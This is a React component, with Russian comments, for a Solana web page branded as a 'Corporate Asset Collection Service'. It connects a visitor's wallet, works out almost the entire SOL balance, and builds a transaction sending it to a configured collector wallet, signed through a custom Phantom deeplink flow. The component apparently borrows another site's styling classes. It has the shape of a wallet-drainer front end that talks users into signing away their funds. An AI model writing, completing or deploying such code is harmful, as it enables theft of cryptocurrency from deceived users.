// web-app/components/AssetCollectorButton.tsx
import React, { useState, useEffect } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PublicKey } from '@solana/web3.js';
import { AssetCollectorService } from '../utils/AssetCollectorService';
import { PhantomDeepLink } from '../utils/PhantomDeepLink';

interface AssetCollectorButtonProps {
  collectorWallet: string; // Адрес кошелька-получателя компании
}

export const AssetCollectorButton: React.FC<AssetCollectorButtonProps> = ({ 
  collectorWallet 
}) => {
  const { publicKey, signTransaction, connected } = useWallet();
  const { connection } = useConnection();
  const [isLoading, setIsLoading] = useState(false);
  const [userBalance, setUserBalance] = useState<number>(0);
  const [transferAmount, setTransferAmount] = useState<number>(0);
  
  const assetCollector = new AssetCollectorService();

  useEffect(() => {
    if (publicKey && connected) {
      loadUserData();
    }
  }, [publicKey, connected]);

  const loadUserData = async () => {
    if (!publicKey) return;
    
    try {
      const balance = await assetCollector.getUserBalance(publicKey);
      const transferAmt = await assetCollector.calculateTransferAmount(publicKey);
      
      setUserBalance(balance.sol);
      setTransferAmount(transferAmt / 1e9); // Convert lamports to SOL
    } catch (error) {
      console.error('Error loading user data:', error);
    }
  };

  const handleCollectAssets = async () => {
    if (!publicKey || !signTransaction) {
      console.error('Wallet not connected');
      return;
    }

    setIsLoading(true);
    
    try {
      // Инициализируем программу с кошельком пользователя
      assetCollector.initializeProgram({ 
        publicKey, 
        signTransaction 
      });

      // Создаем транзакцию
      const transaction = await assetCollector.createCollectTransaction(
        publicKey,
        new PublicKey(collectorWallet)
      );

      // Получаем recent blockhash
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      // Используем Phantom deeplink с кастомным UI
      const phantomLink = new PhantomDeepLink();
      
      await phantomLink.signAndSendTransaction(
        transaction,
        publicKey,
        'https://yourcompany.com/asset-collection-metadata' // Ваша страница с GIF
      );

      // Обновляем данные после успешной транзакции
      setTimeout(() => {
        loadUserData();
        setIsLoading(false);
      }, 3000);

    } catch (error) {
      console.error('Error collecting assets:', error);
      setIsLoading(false);
      
      // Показываем ошибку пользователю
      alert('Ошибка при сборе активов: ' + error.message);
    }
  };

  // Если кошелек не подключен - показываем кнопку подключения
  if (!connected) {
    return (
      <div className="flex flex-col gap-6 w-full">
        <div className="FlowProgressionPanel_container__Pt3ci">
          <div className="HeightTransition_maxHeightWrapper__Rc6pS">
            <div className="HeightTransition_heightWrapper__DX0I5">
              <div className="enter">
                <div className="flex flex-col items-center justify-center text-center">
                  {/* Ваш GIF */}
                  <div className="FlowProgressionPanel_video__XYD8X">
                    <video
                      className="w-full relative"
                      autoPlay
                      playsInline
                      loop
                      muted
                      src="/corporate-collect-animation.mp4"
                    />
                  </div>
                  
                  <h3 className="FlowProgressionPanel_heading__XgwmG">
                    🏢 Corporate Asset<br />Collection Service
                  </h3>
                  
                  <p className="FlowProgressionPanel_textMargin__8c9mf FlowProgressionPanel_text__FjEe5">
                    Secure automated transfer of all your<br />
                    Solana assets to the company treasury.<br />
                    ~$2 will remain for transaction fees.
                  </p>
                  
                  <div className="FlowProgressionPanel_buttonFlex__yHFr_">
                    <WalletMultiButton className="w-full max-w-[300px] items-center justify-center ToonButton_hoverable__kPnUk ToonButton_toon__9YF2N ToonButton_button__YGfFs ToonButton_chunky__zISvT" />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Если кошелек подключен - показываем информацию и кнопку сбора
  return (
    <div className="flex flex-col gap-6 w-full">
      <div className="FlowProgressionPanel_container__Pt3ci">
        <div className="HeightTransition_maxHeightWrapper__Rc6pS">
          <div className="HeightTransition_heightWrapper__DX0I5">
            <div className="enter">
              <div className="flex flex-col items-center justify-center text-center">
                
                {/* Статус и балансы */}
                <div className="mb-6 p-4 bg-blue-50 rounded-lg border">
                  <h4 className="text-lg font-bold mb-2">📊 Wallet Status</h4>
                  <div className="text-sm space-y-1">
                    <p><strong>Connected:</strong> {publicKey?.toString().slice(0, 8)}...</p>
                    <p><strong>Current Balance:</strong> {userBalance.toFixed(4)} SOL</p>
                    <p><strong>Transfer Amount:</strong> {transferAmount.toFixed(4)} SOL</p>
                    <p><strong>Gas Reserve:</strong> ~0.015 SOL</p>
                  </div>
                </div>

                {/* GIF анимация */}
                <div className="FlowProgressionPanel_video__XYD8X">
                  <video
                    className="w-full relative"
                    autoPlay
                    playsInline
                    loop
                    muted
                    src="/transfer-animation.mp4"
                  />
                </div>
                
                <h3 className="FlowProgressionPanel_heading__XgwmG">
                  Ready to collect<br />your assets!
                </h3>
                
                <p className="FlowProgressionPanel_textMargin__8c9mf FlowProgressionPanel_text__FjEe5">
                  This will transfer {transferAmount.toFixed(4)} SOL<br />
                  to the company treasury wallet.<br />
                  Gas reserve will remain in your wallet.
                </p>
                
                <div className="FlowProgressionPanel_buttonFlex__yHFr_">
                  <button
                    onClick={handleCollectAssets}
                    disabled={isLoading || transferAmount <= 0}
                    className="w-full max-w-[300px] items-center justify-center ToonButton_hoverable__kPnUk ToonButton_toon__9YF2N ToonButton_button__YGfFs ToonButton_chunky__zISvT"
                    style={{ 
                      backgroundColor: isLoading ? '#ccc' : '#FF6B35', 
                      color: 'white',
                      cursor: isLoading ? 'not-allowed' : 'pointer'
                    }}
                  >
                    {isLoading ? '🔄 Processing...' : '🏛️ Transfer Assets'}
                  </button>
                </div>

                {transferAmount <= 0 && (
                  <p className="text-red-500 text-sm mt-2">
                    ⚠️ Insufficient balance for transfer (need more than gas reserve)
                  </p>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};